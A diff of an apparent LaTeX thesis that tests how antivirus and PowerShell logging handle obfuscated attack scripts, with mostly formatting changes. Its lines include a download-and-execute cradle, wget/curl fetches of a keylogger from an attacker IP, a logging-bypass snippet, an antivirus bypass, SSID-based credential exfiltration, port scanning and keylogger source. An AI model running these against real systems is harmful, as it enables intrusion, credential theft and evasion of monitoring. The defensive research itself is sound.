@@ -323,14 +323,15 @@ This thesis will make use of these terms when refering to an obfuscation techniq
 \subsection{Which obfuscation methods are labeled malicious by antivirus software, regardless of the content of the script}
 [\hyperlink{o2}{o2}]It is well known that the [\hyperlink{8}{8}]Microsoft team already knows about the issues of obfuscated code. Therefore it can be assumed that some protection measures against obfuscation of code has already taken place by both [\hyperlink{4}{4}] windows tools such as windows-defender but also third party antivirus software. This became more apparent at the start of this project, when some non malicious code was labeled as malicious by windows defender and other antivirus programs. This created a new sub-questions that had to be answered first before any other question could be answered. Namely which obfuscated techniques are automatically considered to be malware by a system, regardless of the actual function of the code. To find the answer for this question a simple \hyperlink{script1}{script} has been executed with different obfuscation techniques using Invoke-Obfuscation. The results can be found in the table 1. The table has four columns with the necessary information required in order to reproduce the results, that is:
 \begin{enumerate}
-	\item[Obfuscation] The commands used to obfuscate the script using Invoke-Obfuscation.
-	\item[OS] The OS that the code was run on.
-	\item[Program] The antivirus program that is currently on the system.
-	\item[Detected] A boolean value indicating the detection and labeling of the script as malicious.
+	\item[]\textbf{Obfuscation:} The commands used to obfuscate the script using Invoke-Obfuscation.
+	\item[]\textbf{OS:} The OS that the code was run on.
+	\item[]\textbf{Program:} The antivirus program that is currently on the system.
+	\item[]\textbf{Detected:} A boolean value indicating the detection and labeling of the script as malicious.
 \end{enumerate}
 The command used to download and execute the scripts was:
 \begin{verbatim}
-Invoke-Expression (New-Object Net.WebCLient).DownloadString("url\script.ps1");
+Invoke-Expression (New-Object Net.WebCLient)
+    .DownloadString("url\script.ps1");
 \end{verbatim}
 When looking at the result, table 1,2,3,4 and 5. It becomes apparent that the defence programs are not working well. The best detection rate can be found for McAfee on Windows 10, which labels every obfuscated script as malicious. This is because, [\hyperlink{o4}{o4}]McAfee, as it's line of defence against fileless scripting, is blocking any PowerShell command that uses \textit{Invoke-Expression} with the \textit{Downloadstring} function. However this can be easily bypassed by downloading the script first, \textbf{Invoke-WebRequest}, and then executing it. In that case McAfee does not block the execution of any script. But to execute scripts which were first downloaded, one would first need to change the ExecutionPolicy of the system to 'Bypass' or create a .bat file that executes the .ps1 file with the \textit{ExecutionPolicy} flag set to \textit{Bypass}. On the other hand windows defender had a more stable result, meaning it can find some of the obfuscated scripts regardless of what command was used to download it. Some versions of windows are not compatible with some encoding types, resulting in an error output. This is indicated in the table with the string 'ERROR'. Furthermore Windows servers were incompatible with avg and McAfee and therefore have a shorter table. In case of Windows 7, it was not possible to install McAfee.
 \subsubsection{Conclusion}
@@ -341,8 +342,10 @@ This question comes forth when looking at how McAfee is blocking the \textbf{Inv
 \begin{verbatim}
 Invoke-WebRequest "http://IPAddress:Port/Get-Keystrokes.ps1" 
       -o "Get-Keystrokes.ps1"
-wget "http://IPAddress:Port/Get-Keystrokes.ps1" -o "Get-Keystrokes.ps1"
-curl "http://IPAddress:Port/Get-Keystrokes.ps1" -o "Get-Keystrokes.ps1"
+wget "http://IPAddress:Port/Get-Keystrokes.ps1" -o 
+    "Get-Keystrokes.ps1"
+curl "http://IPAddress:Port/Get-Keystrokes.ps1" -o
+    "Get-Keystrokes.ps1"
 \end{verbatim}
 Many different iterations of the obfuscation tools were used, with the focus on [\hyperlink{o1}{o1}]Token,AST,String and Encoding. The answer was very clear, all antivirus programs were able to detect the malware before it got downloaded and blocked it one hundred percent of the time. On the other hand, when \textbf{secure-string} encoding is used, the script could be easily downloaded without notifying any AV program.
 \subsubsection{Conclusion}
@@ -373,7 +376,8 @@ The log file has been written over multiple times which removed all the warning 
 The PowerShell logging tool is indeed capable to deobfuscate obfuscated scripts. The module logging, as stated in \hyperlink{o8}{o8}, can find invocation commands when called through the obfuscated script, which would mean that a SIEM tools could use the log file to detect a security breach. However bypassing it is fairly simple. A hacker could test the obfuscated script on his own VM first before running it on the victim's system in order to find the right obfuscation for the script. The PowerShell scriptblock logging tool on the other hand, is much more powerful. It can not only deobfuscate scriptblocks, it also can scan the unobfuscated scripts and compare them to known malicious scripts. When the logging tool finds a match it labels the scriptblock as potentially malicious which can be seen in \hyperlink{fig1}{figure 1}.
 There are multiple ways to bypass the logging tools. The most commonly used bypass would be [\hyperlink{o7}{o7}]:
 \begin{verbatim}
-$settings = [Ref].Assembly.GetType(“System.Management.Automation.Utils")
+$settings = [Ref].Assembly.GetType
+  (“System.Management.Automation.Utils")
 .GetField(“cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
 $settings
 [“HKEY_LOCAL_MACHINE\Software\Policies
@@ -590,7 +594,8 @@ IPAddress HostName Ports
 In this case there are no other machines in the network, therefore another scan is done just for the victim machine.\\
 \textbf{Step 7}\hypertarget{attack7}.\hfill
 \begin{verbatim}
-Invoke-PortScan -StartAddress 10.0.2.15 -EndAddress 10.0.2.15 -ResolveHost -ScanPort
+Invoke-PortScan -StartAddress 10.0.2.15
+    -EndAddress 10.0.2.15 -ResolveHost -ScanPort
 \end{verbatim}
 Output:
 \begin{verbatim}
@@ -635,13 +640,14 @@ NAME
     Invoke-SSIDExfil
     
 SYNOPSIS
-    Nishang script which can exfiltrate information like user credentials,
-    using WLAN SSID.
+    Nishang script which can exfiltrate information
+    like user credentials, using WLAN SSID.
     
     
 SYNTAX
-    Invoke-SSIDExfil [[-StringToDecode] <String>] [[-StringToExfiltrate]
-    <String>] [-ExfilOnly] [-Decode] [<CommonParameters>]
+    Invoke-SSIDExfil [[-StringToDecode] <String>]
+    [[-StringToExfiltrate] <String>] [-ExfilOnly] [-Decode]
+        [<CommonParameters>]
     
     
 DESCRIPTION
@@ -652,15 +658,15 @@ DESCRIPTION
 Although a system admin might not fall for this trick, many normal computer users will. This means that an attacker, when targeting a normal user, uses this scripts, then the chances of the attacker gaining root privilege is high.
 After the victim used their password, the following information was given to the attacker.
 \textit{Figure 3: Output Invoke-SSIDExfil}\\
-\includegraphics[scale=0.5]{result.png}
+\includegraphics[scale=0.48]{result.png}
 \subsubsection{conclusion}
 By using this SSID and Key the attacker can now advance towards gaining root privileges on the victim machine. This is also where the attack scenario given will end. It is worth noting once again that all the information that was extracted from the victims machine, was extracted while AV was turned on. This is probably the case because scanning tools do not modify any vital parameter in a machine and therefore seem much more harmless then malware even though the potential of scanning scripts can be much more dangerous then a ransomware script. Whit this, the sub-question of this section can be answered. While AV does a good job protect a users machine against malware, it fails to defend a user from reconnaissance scripts. Therefore hackers can make good use of the PowerShell built in commands to write sophisticated scanning scripts and gather valuable information that could aide the attacker in their next attack phases. A good example used here was \textbf{Get-Information}, which has given the attacker the name of the admin account along with all the software currently installed on the computer. The logging tool however does document the attack correctly. It even stores values such as the attackers ip, which can be very use full for the forensic analysis done after the attack.\newpage
 \textit{Figure 4: Scriptblock logging log for reverse shell script}\\
-\includegraphics[scale=0.45]{20.png}
+\includegraphics[scale=0.40]{20.png}
 To gain a log file with the least amount of noise possible, as in log entries that have nothing to do with the attack, a new script was created that executes step $1$ to step $10$. The script can be found as an attachment called \hyperlink{script3}{Invoke-SuperScript}. The log file was filtered with eventID $4104$. This presented the following result:
 \newpage
 \textit{Figure 5: ScriptBlockLogging log for Invoke-SuperScript.ps1 Unobfuscated}\\
-\includegraphics[scale=0.45]{21.png}
+\includegraphics[scale=0.40]{21.png}
 The log file was able to mark the scripts with the warning level. This already seems more promising then the AV-programs. However as mentioned in section 3.2, the attacker can obfuscate their script in order to overwrite important log entries and therefore cover their tracks. Although this attack was tested on a machine using the archiving property of Event Viewer, the default setting is to overwrite old event entries. Meaning that a obfuscated script would in general overwrite the important log entries shown in figure $5$. In the next section, the thesis will discus some strategies to circumvent this issue.
 \newpage
 \subsection{What additional defence systems can be deployed against obfuscated PowerShell scripts}
@@ -734,7 +740,8 @@ During the tests many attempts were made on attacking the system. In this sectio
 	\item When PowerShell v$2$ was called through CMD-shell with a reverse shell, the connection with the victim machine was disabled. To use PowerShell -v$2$ while using reverse shell, it is required to send the command as a parameter.
 	For example by typing the following in the CMD terminal:
 	\begin{verbatim}
-	PowerShell -v 2 -NoProfile -ExecutionPolicy bypass -C "echo 'Hello World!'"
+	PowerShell -v 2 -NoProfile -ExecutionPolicy
+	    bypass -C "echo 'Hello World!'"
 	\end{verbatim}
 	Once the command has been executed the PowerShell process will terminate giving the attacker control over the CMD-terminal again. During this process no additional logs were created. However the command given as parameter could be read inside the title bar of the CMD-terminal. Perhaps this finding can help to create a counter measure for the usage of PowerShell -v$2$.
 \end{enumerate}
@@ -959,20 +966,20 @@ Compress    & Win 2019 & Windows Defender & No       \\ \hline
 \begin{center}
 \begin{tabular}{|l|l|l|l|l|l|}
 \hline
-Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 10/2016/2019 & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 1       & 10               \\\hline
 PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
 PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 1       & 10               \\\hline
                      &        &                 &               &         &                  \\\hline
                      &        &                 &               &         &                  \\\hline
-Windows 8.1 Default  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 8.1 Default  & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
 PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
 PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10               \\\hline
                      &        &                 &               &         &                  \\\hline
-Windows 8.1 (A.P.L)  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 8.1 (A.P.L)  & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
 PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       & 10               \\\hline
@@ -985,20 +992,20 @@ PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10  
 \caption {Log file information after execution of Keylogger. With archive enabled}
 \label{tab:table_seven}
 \begin{tabular}{|l|l|l|l|l|l|}\hline
-Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 10/2016/2019 & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 30283  & 50              & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       & 10               \\\hline
 PS-SL-Obfuscated     & 113258 & 187             & information   & 0       & 10               \\\hline
 PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       & 10               \\\hline
                      &        &                 &               &         &                  \\\hline
                      &        &                 &               &         &                  \\\hline
-Windows 8.1 Default  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 8.1 Default  & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 15     & 1               & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 4      & 1               & verbose       & 0       & 10               \\\hline
 PS-SL-Obfuscated     & 8      & 1               & information   & 0       & 10               \\\hline
 PS-SL-Un-Obfuscated  & 6      & 1               & verbose       & 0       & 10               \\\hline
                      &        &                 &               &         &                  \\\hline
-Windows 8.1 (A.P.L)  & Events & File size in Mb & Highest Level & Warning & E.T. in seconds  \\\hline
+Windows 8.1 (A.P.L)  & Events & Filesize (mb) & Highest Level & Warning & E.T. (s)  \\\hline
 PS-ML-Obfuscated     & 28524  & 46              & verbose       & 0       & 10               \\\hline
 PS-ML-Un-Obfuscated  & 687    & 1               & verbose       & 0       & 10               \\\hline
 PS-SL-Obfuscated     & 30458  & 58              & verbose       & 0       & 10               \\\hline
@@ -1012,20 +1019,20 @@ PS-SL-Un-Obfuscated  & 689    & 1               & verbose       & 0       & 10  
 \begin{center}
 \begin{tabular}{|l|l|l|l|l|}
 \hline
-Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning \\\hline
+Windows 10/2016/2019 & Events & Filesize (mb) & Highest Level & Warning \\\hline
 PS-ML-Obfuscated     & 183    & 1.07            & verbose       & 0       \\\hline
 PS-ML-Un-Obfuscated  & 134    & 1               & verbose       & 0       \\\hline
 PS-SL-Obfuscated     & 9377   & 8.07            & information   & 50      \\\hline
 PS-SL-Un-Obfuscated  & 326    & 1               & Warning       & 50      \\\hline
                      &        &                 &               &         \\\hline
                      &        &                 &               &         \\\hline
-Windows 8.1 Default  & Events & File size in Mb & Highest Level & Warning \\\hline
+Windows 8.1 Default  & Events & Filesize (mb) & Highest Level & Warning \\\hline
 PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       \\\hline
 PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       \\\hline
 PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       \\\hline
                      &        &                 &               &         \\\hline
-Windows 8.1 (A.P.L)  & Events & File size in Mb & Highest Level & Warning \\\hline
+Windows 8.1 (A.P.L)  & Events & Filesize (mb) & Highest Level & Warning \\\hline
 PS-ML-Obfuscated     & 9296   & 15              & verbose       & 0       \\\hline
 PS-ML-Un-Obfuscated  & 550    & 1               & verbose       & 0       \\\hline
 PS-SL-Obfuscated     & 8291   & 16.5            & information   & 0       \\\hline
@@ -1039,7 +1046,7 @@ PS-SL-Un-Obfuscated  & 556    & 1               & verbose       & 0       \\\hli
 \hypertarget{table9}\hfill
 \begin{center}
 \begin{tabular}{|l|l|l|l|l|l|}\hline
-Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds \\\hline
+Windows 10/2016/2019 & Events & Filesize (mb) & Highest Level & Warning & E.T. (s) \\\hline
 PS-ML-Obfuscated     & 605    & 2               & verbose       & 0       & 600             \\\hline
 PS-ML-Un-Obfuscated  & 2689   & 4               & verbose       & 0       & 1200            \\\hline
 PS-SL-Obfuscated     & 425816 & 223             & Warning       & 24      & 600             \\\hline
@@ -1052,7 +1059,7 @@ PS-SL-Un-Obfuscated  & 25596  & 16.07           & Warning       & 3       & 1200
 \label{tab:table_ten}
 \hypertarget{table10}\hfill
 \begin{tabular}{|l|l|l|l|l|l|}\hline
-Windows 10/2016/2019 & Events & File size in Mb & Highest Level & Warning & E.T. in seconds \\\hline
+Windows 10/2016/2019 & Events & Filesize (mb) & Highest Level & Warning & E.T. (s) \\\hline
 PS-ML-Obfuscated     & 35231    & 134               & verbose       & 0       & 10              \\\hline
 PS-ML-Un-Obfuscated  & N/A    & N/A               & N/A       & N/A       & N/A              \\\hline
 PS-SL-Obfuscated     & 483822    & 247               & Warning       & 48      & 10              \\\hline
@@ -1078,9 +1085,11 @@ public static extern int GetKeyboardState(byte[] keystate);
 public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode,
-	byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+	byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff,
+	  uint wFlags);
 '@
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace
+    API -PassThru
   $null = New-Item -Path $Path -ItemType File -Force
   try
   {
@@ -1096,8 +1105,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode,
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
           $mychar = New-Object -TypeName System.Text.StringBuilder
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar,
-          $mychar.Capacity, 0)
+          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate,
+              $mychar, $mychar.Capacity, 0)
           if ($success) 
           {
             [System.IO.File]::AppendAllText($Path, $mychar, [
@@ -1158,8 +1167,8 @@ At line:27 char:21
     PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
  
 get-childitem : Cannot find path
-'HKEY_CURRENT_USER\software\simontatham\putty\sessions' because it 
-does not exist.
+'HKEY_CURRENT_USER\software\simontatham\putty\sessions'
+because it does not exist.
 At line:27 char:21
 +         else{$key = get-childitem $regkey}
 +                     ~~~~~~~~~~~~~~~~~~~~~
@@ -1170,8 +1179,8 @@ At line:27 char:21
     PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
  
 get-item : Cannot find path
-'HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' 
-because it does not exist.
+'HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\
+validcommunities' because it does not exist.
 At line:26 char:37
 +         if ($child -eq "no"){$key = get-item $regkey}
 +                                     ~~~~~~~~~~~~~~~~
@@ -1182,8 +1191,8 @@ At line:26 char:37
     PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
  
 get-item : Cannot find path
-'HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities' 
-because it does not exist.
+'HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\
+    validcommunities' because it does not exist.
 At line:26 char:37
 +         if ($child -eq "no"){$key = get-item $regkey}
 +                                     ~~~~~~~~~~~~~~~~
@@ -1192,7 +1201,6 @@ At line:26 char:37
     ItemNotFoundException
     + FullyQualifiedErrorId :
     PathNotFound,Microsoft.PowerShell.Commands.GetItemCommand
- 
 
 Logged in users:
 C:\Windows\system32\config\systemprofile
@@ -1224,8 +1232,9 @@ Install
 C:\Windows\system32\cmd.exe
 C:\Windows\System32\Drivers\DriverData
 Windows_NT
-C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Window
-\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;
+  C:\Window\System32\WindowsPowerShell\v1.0\;C:\Windows
+    \System32\OpenSSH\
 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
 AMD64
 C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32
@@ -1438,7 +1447,8 @@ The following command was not found: wlan show all.
 \end{verbatim}
 \hypertarget{output2}{\subsubsection{Single event of PowerShell scriptblock logging}}
 \begin{lstlisting}
-<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+<Event xmlns='http://schemas.microsoft.com/
+    win/2004/08/events/event'>
 <System>
 	<Provider Name='Microsoft-Windows-PowerShell'
 		Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/>
@@ -1448,17 +1458,20 @@ The following command was not found: wlan show all.
 	<Task>2</Task>
 	<Opcode>15</Opcode>
 	<Keywords>0x0</Keywords>
-	<TimeCreated SystemTime='2020-11-24T23:51:38.110905600Z'/>
+	<TimeCreated SystemTime='2020-11-24T23:51:
+	    38.110905600Z'/>
 	<EventRecordID>3678861</EventRecordID>
 	<Correlation 
-		ActivityID='{cd0c0d8f-c305-0000-60b6-0ccd05c3d601}'/>
+		ActivityID='{cd0c0d8f-c305-0000-60b6-
+		    0ccd05c3d601}'/>
 	<Execution ProcessID='888' ThreadID='4004'/>
 	<Channel>
 		Microsoft-Windows-PowerShell/Operational
 	</Channel>
 	<Computer>WIN-H8C7LGTI40B</Computer>
 	<Security 
-		UserID='S-1-5-21-3092757730-2535432651-4254931961-500'
+		UserID='S-1-5-21-3092757730-2535432651-
+		    4254931961-500'
 	/>
 </System>
 <EventData>
@@ -1473,13 +1486,16 @@ The following command was not found: wlan show all.
 <RenderingInfo Culture='en-US'>
 	<Message>Creating Scriptblock text (1 of 1):
 		prompt
-		ScriptBlock ID: e05f3001-ea7a-42ba-9da1-44bb4f5f08ba
+		ScriptBlock ID: e05f3001-ea7a-42ba-9da1-
+		    44bb4f5f08ba
 		Path: 
 	</Message>
 	<Level>Verbose</Level>
 	<Task>Execute a Remote Command</Task>
 	<Opcode>On create calls</Opcode>
-	<Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+	<Channel>
+	    Microsoft-Windows-PowerShell/Operational
+	</Channel>
 	<Provider></Provider>
 	<Keywords></Keywords>
 </RenderingInfo>
